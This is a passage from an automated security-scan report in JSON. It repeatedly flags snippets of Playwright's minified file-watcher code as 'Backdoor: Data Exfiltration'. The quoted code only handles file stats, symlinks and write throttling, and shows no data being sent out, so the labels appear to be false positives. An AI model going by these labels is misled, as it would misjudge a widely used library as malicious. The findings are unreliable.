                      "text": "et i=t||this.options.disableGlobbing||!Ps(e)?e:kp(e),s=this.options.followSymlinks;return new Us(e,i,s,this)}_getWatchedDir(e){this._boundRemove||(this._boundRemove=this._remove.bind(this));let t=H.resolve(e);return this._watched.has(t)||this._watched.set(t,new Ws(t,this._boundRemove)),this._watched.get(t)}_hasReadPermissions(e){if(this.options.ignorePermissionErrors)return!0;let i=(e&&Number.parseInt(e.mode,10))&511;return!!(4&Number.parseInt(i.toString(8)[0],10))}_remove(e,t,i){let s=H.join(e,t),n=H.resolve(s);if(i=i!=null?i:this._watched.has(s)||this._watched.has(n),!this._throttle(\"remove\",s,10",
                      "markdown": "`et i=t||this.options.disableGlobbing||!Ps(e)?e:kp(e),s=this.options.followSymlinks;return new Us(e,i,s,this)}_getWatchedDir(e){this._boundRemove||(this._boundRemove=this._remove.bind(this));let t=H.resolve(e);return this._watched.has(t)||this._watched.set(t,new Ws(t,this._boundRemove)),this._watched.get(t)}_hasReadPermissions(e){if(this.options.ignorePermissionErrors)return!0;let i=(e&&Number.parseInt(e.mode,10))&511;return!!(4&Number.parseInt(i.toString(8)[0],10))}_remove(e,t,i){let s=H.join(e,t),n=H.resolve(s);if(i=i!=null?i:this._watched.has(s)||this._watched.has(n),!this._throttle(\"remove\",s,10`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 27629,
                  "endLine": 52,
                  "endColumn": 27634,
                  "snippet": {
                    "text": "i,s){let n,u=e;this.options.cwd&&!H.isAbsolute(e)&&(u=H.join(this.options.cwd,e));let o=new Date,a=l=>{zs.stat(u,(c,h)=>{if(c||!this._pendingWrites.has(e)){c&&c.code!==\"ENOENT\"&&s(c);return}let f=Number(new Date);l&&h.size!==l.size&&(this._pendingWrites.get(e).lastChange=f);let p=this._pendingWrites.get(e);f-p.lastChange>=t?(this._pendingWrites.delete(e),s(void 0,h)):n=setTimeout(a,this.options.awaitWriteFinish.pollInterval,h)})};this._pendingWrites.has(e)||(this._pendingWrites.set(e,{lastChange:o,cancelWait:()=>(this._pendingWrites.delete(e),clearTimeout(n),i)}),n=setTimeout(a,this.options.awaitWr",
                    "rendered": {
                      "text": "i,s){let n,u=e;this.options.cwd&&!H.isAbsolute(e)&&(u=H.join(this.options.cwd,e));let o=new Date,a=l=>{zs.stat(u,(c,h)=>{if(c||!this._pendingWrites.has(e)){c&&c.code!==\"ENOENT\"&&s(c);return}let f=Number(new Date);l&&h.size!==l.size&&(this._pendingWrites.get(e).lastChange=f);let p=this._pendingWrites.get(e);f-p.lastChange>=t?(this._pendingWrites.delete(e),s(void 0,h)):n=setTimeout(a,this.options.awaitWriteFinish.pollInterval,h)})};this._pendingWrites.has(e)||(this._pendingWrites.set(e,{lastChange:o,cancelWait:()=>(this._pendingWrites.delete(e),clearTimeout(n),i)}),n=setTimeout(a,this.options.awaitWr",
                      "markdown": "`i,s){let n,u=e;this.options.cwd&&!H.isAbsolute(e)&&(u=H.join(this.options.cwd,e));let o=new Date,a=l=>{zs.stat(u,(c,h)=>{if(c||!this._pendingWrites.has(e)){c&&c.code!==\"ENOENT\"&&s(c);return}let f=Number(new Date);l&&h.size!==l.size&&(this._pendingWrites.get(e).lastChange=f);let p=this._pendingWrites.get(e);f-p.lastChange>=t?(this._pendingWrites.delete(e),s(void 0,h)):n=setTimeout(a,this.options.awaitWriteFinish.pollInterval,h)})};this._pendingWrites.has(e)||(this._pendingWrites.set(e,{lastChange:o,cancelWait:()=>(this._pendingWrites.delete(e),clearTimeout(n),i)}),n=setTimeout(a,this.options.awaitWr`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 27582,
                  "endLine": 52,
                  "endColumn": 27587,
                  "snippet": {
                    "text": "eturn this._readyCount++}_awaitWriteFinish(e,t,i,s){let n,u=e;this.options.cwd&&!H.isAbsolute(e)&&(u=H.join(this.options.cwd,e));let o=new Date,a=l=>{zs.stat(u,(c,h)=>{if(c||!this._pendingWrites.has(e)){c&&c.code!==\"ENOENT\"&&s(c);return}let f=Number(new Date);l&&h.size!==l.size&&(this._pendingWrites.get(e).lastChange=f);let p=this._pendingWrites.get(e);f-p.lastChange>=t?(this._pendingWrites.delete(e),s(void 0,h)):n=setTimeout(a,this.options.awaitWriteFinish.pollInterval,h)})};this._pendingWrites.has(e)||(this._pendingWrites.set(e,{lastChange:o,cancelWait:()=>(this._pendingWrites.delete(e),clearTime",
                    "rendered": {
                      "text": "eturn this._readyCount++}_awaitWriteFinish(e,t,i,s){let n,u=e;this.options.cwd&&!H.isAbsolute(e)&&(u=H.join(this.options.cwd,e));let o=new Date,a=l=>{zs.stat(u,(c,h)=>{if(c||!this._pendingWrites.has(e)){c&&c.code!==\"ENOENT\"&&s(c);return}let f=Number(new Date);l&&h.size!==l.size&&(this._pendingWrites.get(e).lastChange=f);let p=this._pendingWrites.get(e);f-p.lastChange>=t?(this._pendingWrites.delete(e),s(void 0,h)):n=setTimeout(a,this.options.awaitWriteFinish.pollInterval,h)})};this._pendingWrites.has(e)||(this._pendingWrites.set(e,{lastChange:o,cancelWait:()=>(this._pendingWrites.delete(e),clearTime",
                      "markdown": "`eturn this._readyCount++}_awaitWriteFinish(e,t,i,s){let n,u=e;this.options.cwd&&!H.isAbsolute(e)&&(u=H.join(this.options.cwd,e));let o=new Date,a=l=>{zs.stat(u,(c,h)=>{if(c||!this._pendingWrites.has(e)){c&&c.code!==\"ENOENT\"&&s(c);return}let f=Number(new Date);l&&h.size!==l.size&&(this._pendingWrites.get(e).lastChange=f);let p=this._pendingWrites.get(e);f-p.lastChange>=t?(this._pendingWrites.delete(e),s(void 0,h)):n=setTimeout(a,this.options.awaitWriteFinish.pollInterval,h)})};this._pendingWrites.has(e)||(this._pendingWrites.set(e,{lastChange:o,cancelWait:()=>(this._pendingWrites.delete(e),clearTime`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 27092,
                  "endLine": 52,
                  "endColumn": 27097,
                  "snippet": {
                    "text": ".code;return e&&t!==\"ENOENT\"&&t!==\"ENOTDIR\"&&(!this.options.ignorePermissionErrors||t!==\"EPERM\"&&t!==\"EACCES\")&&this.emit(Is,e),e||this.closed}_throttle(e,t,i){this._throttled.has(e)||this._throttled.set(e,new Map);let s=this._throttled.get(e),n=s.get(t);if(n)return n.count++,!1;let u,o=()=>{let l=s.get(t),c=l?l.count:0;return s.delete(t),clearTimeout(u),l&&clearTimeout(l.timeoutObject),c};u=setTimeout(o,i);let a={timeoutObject:u,clear:o,count:0};return s.set(t,a),a}_incrReadyCount(){return this._readyCount++}_awaitWriteFinish(e,t,i,s){let n,u=e;this.options.cwd&&!H.isAbsolute(e)&&(u=H.join(this.op",
                    "rendered": {
                      "text": ".code;return e&&t!==\"ENOENT\"&&t!==\"ENOTDIR\"&&(!this.options.ignorePermissionErrors||t!==\"EPERM\"&&t!==\"EACCES\")&&this.emit(Is,e),e||this.closed}_throttle(e,t,i){this._throttled.has(e)||this._throttled.set(e,new Map);let s=this._throttled.get(e),n=s.get(t);if(n)return n.count++,!1;let u,o=()=>{let l=s.get(t),c=l?l.count:0;return s.delete(t),clearTimeout(u),l&&clearTimeout(l.timeoutObject),c};u=setTimeout(o,i);let a={timeoutObject:u,clear:o,count:0};return s.set(t,a),a}_incrReadyCount(){return this._readyCount++}_awaitWriteFinish(e,t,i,s){let n,u=e;this.options.cwd&&!H.isAbsolute(e)&&(u=H.join(this.op",
                      "markdown": "`.code;return e&&t!==\"ENOENT\"&&t!==\"ENOTDIR\"&&(!this.options.ignorePermissionErrors||t!==\"EPERM\"&&t!==\"EACCES\")&&this.emit(Is,e),e||this.closed}_throttle(e,t,i){this._throttled.has(e)||this._throttled.set(e,new Map);let s=this._throttled.get(e),n=s.get(t);if(n)return n.count++,!1;let u,o=()=>{let l=s.get(t),c=l?l.count:0;return s.delete(t),clearTimeout(u),l&&clearTimeout(l.timeoutObject),c};u=setTimeout(o,i);let a={timeoutObject:u,clear:o,count:0};return s.set(t,a),a}_incrReadyCount(){return this._readyCount++}_awaitWriteFinish(e,t,i,s){let n,u=e;this.options.cwd&&!H.isAbsolute(e)&&(u=H.join(this.op`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 27039,
                  "endLine": 52,
                  "endColumn": 27044,
                  "snippet": {
                    "text": "this.emitWithAll(e,o),this}_handleError(e){let t=e&&e.code;return e&&t!==\"ENOENT\"&&t!==\"ENOTDIR\"&&(!this.options.ignorePermissionErrors||t!==\"EPERM\"&&t!==\"EACCES\")&&this.emit(Is,e),e||this.closed}_throttle(e,t,i){this._throttled.has(e)||this._throttled.set(e,new Map);let s=this._throttled.get(e),n=s.get(t);if(n)return n.count++,!1;let u,o=()=>{let l=s.get(t),c=l?l.count:0;return s.delete(t),clearTimeout(u),l&&clearTimeout(l.timeoutObject),c};u=setTimeout(o,i);let a={timeoutObject:u,clear:o,count:0};return s.set(t,a),a}_incrReadyCount(){return this._readyCount++}_awaitWriteFinish(e,t,i,s){let n,u=e;",
                    "rendered": {
                      "text": "this.emitWithAll(e,o),this}_handleError(e){let t=e&&e.code;return e&&t!==\"ENOENT\"&&t!==\"ENOTDIR\"&&(!this.options.ignorePermissionErrors||t!==\"EPERM\"&&t!==\"EACCES\")&&this.emit(Is,e),e||this.closed}_throttle(e,t,i){this._throttled.has(e)||this._throttled.set(e,new Map);let s=this._throttled.get(e),n=s.get(t);if(n)return n.count++,!1;let u,o=()=>{let l=s.get(t),c=l?l.count:0;return s.delete(t),clearTimeout(u),l&&clearTimeout(l.timeoutObject),c};u=setTimeout(o,i);let a={timeoutObject:u,clear:o,count:0};return s.set(t,a),a}_incrReadyCount(){return this._readyCount++}_awaitWriteFinish(e,t,i,s){let n,u=e;",
                      "markdown": "`this.emitWithAll(e,o),this}_handleError(e){let t=e&&e.code;return e&&t!==\"ENOENT\"&&t!==\"ENOTDIR\"&&(!this.options.ignorePermissionErrors||t!==\"EPERM\"&&t!==\"EACCES\")&&this.emit(Is,e),e||this.closed}_throttle(e,t,i){this._throttled.has(e)||this._throttled.set(e,new Map);let s=this._throttled.get(e),n=s.get(t);if(n)return n.count++,!1;let u,o=()=>{let l=s.get(t),c=l?l.count:0;return s.delete(t),clearTimeout(u),l&&clearTimeout(l.timeoutObject),c};u=setTimeout(o,i);let a={timeoutObject:u,clear:o,count:0};return s.set(t,a),a}_incrReadyCount(){return this._readyCount++}_awaitWriteFinish(e,t,i,s){let n,u=e;`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 27028,
                  "endLine": 52,
                  "endColumn": 27033,
                  "snippet": {
                    "text": "(h)}return this.emitWithAll(e,o),this}_handleError(e){let t=e&&e.code;return e&&t!==\"ENOENT\"&&t!==\"ENOTDIR\"&&(!this.options.ignorePermissionErrors||t!==\"EPERM\"&&t!==\"EACCES\")&&this.emit(Is,e),e||this.closed}_throttle(e,t,i){this._throttled.has(e)||this._throttled.set(e,new Map);let s=this._throttled.get(e),n=s.get(t);if(n)return n.count++,!1;let u,o=()=>{let l=s.get(t),c=l?l.count:0;return s.delete(t),clearTimeout(u),l&&clearTimeout(l.timeoutObject),c};u=setTimeout(o,i);let a={timeoutObject:u,clear:o,count:0};return s.set(t,a),a}_incrReadyCount(){return this._readyCount++}_awaitWriteFinish(e,t,i,s)",
                    "rendered": {
                      "text": "(h)}return this.emitWithAll(e,o),this}_handleError(e){let t=e&&e.code;return e&&t!==\"ENOENT\"&&t!==\"ENOTDIR\"&&(!this.options.ignorePermissionErrors||t!==\"EPERM\"&&t!==\"EACCES\")&&this.emit(Is,e),e||this.closed}_throttle(e,t,i){this._throttled.has(e)||this._throttled.set(e,new Map);let s=this._throttled.get(e),n=s.get(t);if(n)return n.count++,!1;let u,o=()=>{let l=s.get(t),c=l?l.count:0;return s.delete(t),clearTimeout(u),l&&clearTimeout(l.timeoutObject),c};u=setTimeout(o,i);let a={timeoutObject:u,clear:o,count:0};return s.set(t,a),a}_incrReadyCount(){return this._readyCount++}_awaitWriteFinish(e,t,i,s)",
                      "markdown": "`(h)}return this.emitWithAll(e,o),this}_handleError(e){let t=e&&e.code;return e&&t!==\"ENOENT\"&&t!==\"ENOTDIR\"&&(!this.options.ignorePermissionErrors||t!==\"EPERM\"&&t!==\"EACCES\")&&this.emit(Is,e),e||this.closed}_throttle(e,t,i){this._throttled.has(e)||this._throttled.set(e,new Map);let s=this._throttled.get(e),n=s.get(t);if(n)return n.count++,!1;let u,o=()=>{let l=s.get(t),c=l?l.count:0;return s.delete(t),clearTimeout(u),l&&clearTimeout(l.timeoutObject),c};u=setTimeout(o,i);let a={timeoutObject:u,clear:o,count:0};return s.set(t,a),a}_incrReadyCount(){return this._readyCount++}_awaitWriteFinish(e,t,i,s)`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 25966,
                  "endLine": 52,
                  "endColumn": 25971,
                  "snippet": {
                    "text": "){this.emit(...t),e!==Is&&this.emit(Ns,...t)}async _emit(e,t,i,s,n){if(this.closed)return;let u=this.options;i0&&(t=H.normalize(t)),u.cwd&&(t=H.relative(u.cwd,t));let o=[e,t];n!==void 0?o.push(i,s,n):s!==void 0?o.push(i,s):i!==void 0&&o.push(i);let a=u.awaitWriteFinish,l;if(a&&(l=this._pendingWrites.get(t)))return l.lastChange=new Date,this;if(u.atomic){if(e===ml)return this._pendingUnlinks.set(t,o),setTimeout(()=>{this._pendingUnlinks.forEach((c,h)=>{this.emit(...c),this.emit(Ns,...c),this._pendingUnlinks.delete(h)})},typeof u.atomic==\"number\"?u.atomic:100),this;e===Fr&&this._pendingUnlinks.has(t)",
                    "rendered": {
                      "text": "){this.emit(...t),e!==Is&&this.emit(Ns,...t)}async _emit(e,t,i,s,n){if(this.closed)return;let u=this.options;i0&&(t=H.normalize(t)),u.cwd&&(t=H.relative(u.cwd,t));let o=[e,t];n!==void 0?o.push(i,s,n):s!==void 0?o.push(i,s):i!==void 0&&o.push(i);let a=u.awaitWriteFinish,l;if(a&&(l=this._pendingWrites.get(t)))return l.lastChange=new Date,this;if(u.atomic){if(e===ml)return this._pendingUnlinks.set(t,o),setTimeout(()=>{this._pendingUnlinks.forEach((c,h)=>{this.emit(...c),this.emit(Ns,...c),this._pendingUnlinks.delete(h)})},typeof u.atomic==\"number\"?u.atomic:100),this;e===Fr&&this._pendingUnlinks.has(t)",
                      "markdown": "`){this.emit(...t),e!==Is&&this.emit(Ns,...t)}async _emit(e,t,i,s,n){if(this.closed)return;let u=this.options;i0&&(t=H.normalize(t)),u.cwd&&(t=H.relative(u.cwd,t));let o=[e,t];n!==void 0?o.push(i,s,n):s!==void 0?o.push(i,s):i!==void 0&&o.push(i);let a=u.awaitWriteFinish,l;if(a&&(l=this._pendingWrites.get(t)))return l.lastChange=new Date,this;if(u.atomic){if(e===ml)return this._pendingUnlinks.set(t,o),setTimeout(()=>{this._pendingUnlinks.forEach((c,h)=>{this.emit(...c),this.emit(Ns,...c),this._pendingUnlinks.delete(h)})},typeof u.atomic==\"number\"?u.atomic:100),this;e===Fr&&this._pendingUnlinks.has(t)`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 14645,
                  "endLine": 52,
                  "endColumn": 14650,
                  "snippet": {
                    "text": "({stop:Ct.watch(r,e)});function Lp(r,e,t,i){let s=ne.extname(e)?ne.dirname(e):e,n=ne.dirname(s),u=st.get(s);Tp(n)&&(s=n);let o=ne.resolve(r),a=o!==e,l=(h,f,p)=>{a&&(h=h.replace(e,o)),(h===o||!h.indexOf(o+ne.sep))&&t(h,f,p)},c=!1;for(let h of st.keys())if(e.indexOf(ne.resolve(h)+ne.sep)===0){s=h,u=st.get(s),c=!0;break}return u||c?u.listeners.add(l):(u={listeners:new Set([l]),rawEmitter:i,watcher:Op(s,(h,f)=>{if(!u.listeners.size)return;let p=Ct.getInfo(h,f);u.listeners.forEach(D=>{D(h,f,p)}),u.rawEmitter(p.event,h,p)})},st.set(s,u)),()=>{let h=u.listeners;if(h.delete(l),!h.size&&(st.delete(s),u.watc",
                    "rendered": {
                      "text": "({stop:Ct.watch(r,e)});function Lp(r,e,t,i){let s=ne.extname(e)?ne.dirname(e):e,n=ne.dirname(s),u=st.get(s);Tp(n)&&(s=n);let o=ne.resolve(r),a=o!==e,l=(h,f,p)=>{a&&(h=h.replace(e,o)),(h===o||!h.indexOf(o+ne.sep))&&t(h,f,p)},c=!1;for(let h of st.keys())if(e.indexOf(ne.resolve(h)+ne.sep)===0){s=h,u=st.get(s),c=!0;break}return u||c?u.listeners.add(l):(u={listeners:new Set([l]),rawEmitter:i,watcher:Op(s,(h,f)=>{if(!u.listeners.size)return;let p=Ct.getInfo(h,f);u.listeners.forEach(D=>{D(h,f,p)}),u.rawEmitter(p.event,h,p)})},st.set(s,u)),()=>{let h=u.listeners;if(h.delete(l),!h.size&&(st.delete(s),u.watc",
                      "markdown": "`({stop:Ct.watch(r,e)});function Lp(r,e,t,i){let s=ne.extname(e)?ne.dirname(e):e,n=ne.dirname(s),u=st.get(s);Tp(n)&&(s=n);let o=ne.resolve(r),a=o!==e,l=(h,f,p)=>{a&&(h=h.replace(e,o)),(h===o||!h.indexOf(o+ne.sep))&&t(h,f,p)},c=!1;for(let h of st.keys())if(e.indexOf(ne.resolve(h)+ne.sep)===0){s=h,u=st.get(s),c=!0;break}return u||c?u.listeners.add(l):(u={listeners:new Set([l]),rawEmitter:i,watcher:Op(s,(h,f)=>{if(!u.listeners.size)return;let p=Ct.getInfo(h,f);u.listeners.forEach(D=>{D(h,f,p)}),u.rawEmitter(p.event,h,p)})},st.set(s,u)),()=>{let h=u.listeners;if(h.delete(l),!h.size&&(st.delete(s),u.watc`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 14445,
                  "endLine": 52,
                  "endColumn": 14450,
                  "snippet": {
                    "text": "p}=Ar(),Fp=r=>isNaN(r)?{}:{depth:r},Rs=Ls(Os.stat),xp=Ls(Os.lstat),fl=Ls(Os.realpath),Sp={stat:Rs,lstat:xp},st=new Map,Rp=10,Bp=new Set([69888,70400,71424,72704,73472,131328,131840,262912]),Op=(r,e)=>({stop:Ct.watch(r,e)});function Lp(r,e,t,i){let s=ne.extname(e)?ne.dirname(e):e,n=ne.dirname(s),u=st.get(s);Tp(n)&&(s=n);let o=ne.resolve(r),a=o!==e,l=(h,f,p)=>{a&&(h=h.replace(e,o)),(h===o||!h.indexOf(o+ne.sep))&&t(h,f,p)},c=!1;for(let h of st.keys())if(e.indexOf(ne.resolve(h)+ne.sep)===0){s=h,u=st.get(s),c=!0;break}return u||c?u.listeners.add(l):(u={listeners:new Set([l]),rawEmitter:i,watcher:Op(s,(h",
                    "rendered": {
                      "text": "p}=Ar(),Fp=r=>isNaN(r)?{}:{depth:r},Rs=Ls(Os.stat),xp=Ls(Os.lstat),fl=Ls(Os.realpath),Sp={stat:Rs,lstat:xp},st=new Map,Rp=10,Bp=new Set([69888,70400,71424,72704,73472,131328,131840,262912]),Op=(r,e)=>({stop:Ct.watch(r,e)});function Lp(r,e,t,i){let s=ne.extname(e)?ne.dirname(e):e,n=ne.dirname(s),u=st.get(s);Tp(n)&&(s=n);let o=ne.resolve(r),a=o!==e,l=(h,f,p)=>{a&&(h=h.replace(e,o)),(h===o||!h.indexOf(o+ne.sep))&&t(h,f,p)},c=!1;for(let h of st.keys())if(e.indexOf(ne.resolve(h)+ne.sep)===0){s=h,u=st.get(s),c=!0;break}return u||c?u.listeners.add(l):(u={listeners:new Set([l]),rawEmitter:i,watcher:Op(s,(h",
                      "markdown": "`p}=Ar(),Fp=r=>isNaN(r)?{}:{depth:r},Rs=Ls(Os.stat),xp=Ls(Os.lstat),fl=Ls(Os.realpath),Sp={stat:Rs,lstat:xp},st=new Map,Rp=10,Bp=new Set([69888,70400,71424,72704,73472,131328,131840,262912]),Op=(r,e)=>({stop:Ct.watch(r,e)});function Lp(r,e,t,i){let s=ne.extname(e)?ne.dirname(e):e,n=ne.dirname(s),u=st.get(s);Tp(n)&&(s=n);let o=ne.resolve(r),a=o!==e,l=(h,f,p)=>{a&&(h=h.replace(e,o)),(h===o||!h.indexOf(o+ne.sep))&&t(h,f,p)},c=!1;for(let h of st.keys())if(e.indexOf(ne.resolve(h)+ne.sep)===0){s=h,u=st.get(s),c=!0;break}return u||c?u.listeners.add(l):(u={listeners:new Set([l]),rawEmitter:i,watcher:Op(s,(h`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 10684,
                  "endLine": 52,
                  "endColumn": 10689,
                  "snippet": {
                    "text": "}return l}async _handleSymlink(e,t,i,s){if(this.fsw.closed)return;let n=e.fullPath,u=this.fsw._getWatchedDir(t);if(!this.fsw.options.followSymlinks){this.fsw._incrReadyCount();let o;try{o=await ws(i)}catch{return this.fsw._emitReady(),!0}return this.fsw.closed?void 0:(u.has(s)?this.fsw._symlinkPaths.get(n)!==o&&(this.fsw._symlinkPaths.set(n,o),this.fsw._emit(wr,i,e.stats)):(u.add(s),this.fsw._symlinkPaths.set(n,o),this.fsw._emit(yr,i,e.stats)),this.fsw._emitReady(),!0)}if(this.fsw._symlinkPaths.has(n))return!0;this.fsw._symlinkPaths.set(n,!0)}_handleRead(e,t,i,s,n,u,o){if(e=se.join(e,Zd),!i.hasGlob",
                    "rendered": {
                      "text": "}return l}async _handleSymlink(e,t,i,s){if(this.fsw.closed)return;let n=e.fullPath,u=this.fsw._getWatchedDir(t);if(!this.fsw.options.followSymlinks){this.fsw._incrReadyCount();let o;try{o=await ws(i)}catch{return this.fsw._emitReady(),!0}return this.fsw.closed?void 0:(u.has(s)?this.fsw._symlinkPaths.get(n)!==o&&(this.fsw._symlinkPaths.set(n,o),this.fsw._emit(wr,i,e.stats)):(u.add(s),this.fsw._symlinkPaths.set(n,o),this.fsw._emit(yr,i,e.stats)),this.fsw._emitReady(),!0)}if(this.fsw._symlinkPaths.has(n))return!0;this.fsw._symlinkPaths.set(n,!0)}_handleRead(e,t,i,s,n,u,o){if(e=se.join(e,Zd),!i.hasGlob",
                      "markdown": "`}return l}async _handleSymlink(e,t,i,s){if(this.fsw.closed)return;let n=e.fullPath,u=this.fsw._getWatchedDir(t);if(!this.fsw.options.followSymlinks){this.fsw._incrReadyCount();let o;try{o=await ws(i)}catch{return this.fsw._emitReady(),!0}return this.fsw.closed?void 0:(u.has(s)?this.fsw._symlinkPaths.get(n)!==o&&(this.fsw._symlinkPaths.set(n,o),this.fsw._emit(wr,i,e.stats)):(u.add(s),this.fsw._symlinkPaths.set(n,o),this.fsw._emit(yr,i,e.stats)),this.fsw._emitReady(),!0)}if(this.fsw._symlinkPaths.has(n))return!0;this.fsw._symlinkPaths.set(n,!0)}_handleRead(e,t,i,s,n,u,o){if(e=se.join(e,Zd),!i.hasGlob`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 8641,
                  "endLine": 52,
                  "endColumn": 8646,
                  "snippet": {
                    "text": ",c(l)}catch{}else c(l)}),o={listeners:s,errHandlers:n,rawEmitters:u,watcher:a},_r.set(e,o)}return()=>{kt(o,Et,s),kt(o,ys,n),kt(o,Nt,u),ul(o.listeners)&&(o.watcher.close(),_r.delete(e),Jd.forEach(cp(o)),o.watcher=void 0,Object.freeze(o))}},_s=new Map,fp=(r,e,t,i)=>{let{listener:s,rawEmitter:n}=i,u=_s.get(e),o=new Set,a=new Set,l=u&&u.options;return l&&(l.persistent<t.persistent||l.interval>t.interval)&&(o=u.listeners,a=u.rawEmitters,Me.unwatchFile(e),u=void 0),u?(It(u,Et,s),It(u,Nt,n)):(u={listeners:s,rawEmitters:n,options:t,watcher:Me.watchFile(e,t,(c,h)=>{bs(u.rawEmitters,p=>{p(wr,e,{curr:c,prev:h",
                    "rendered": {
                      "text": ",c(l)}catch{}else c(l)}),o={listeners:s,errHandlers:n,rawEmitters:u,watcher:a},_r.set(e,o)}return()=>{kt(o,Et,s),kt(o,ys,n),kt(o,Nt,u),ul(o.listeners)&&(o.watcher.close(),_r.delete(e),Jd.forEach(cp(o)),o.watcher=void 0,Object.freeze(o))}},_s=new Map,fp=(r,e,t,i)=>{let{listener:s,rawEmitter:n}=i,u=_s.get(e),o=new Set,a=new Set,l=u&&u.options;return l&&(l.persistent<t.persistent||l.interval>t.interval)&&(o=u.listeners,a=u.rawEmitters,Me.unwatchFile(e),u=void 0),u?(It(u,Et,s),It(u,Nt,n)):(u={listeners:s,rawEmitters:n,options:t,watcher:Me.watchFile(e,t,(c,h)=>{bs(u.rawEmitters,p=>{p(wr,e,{curr:c,prev:h",
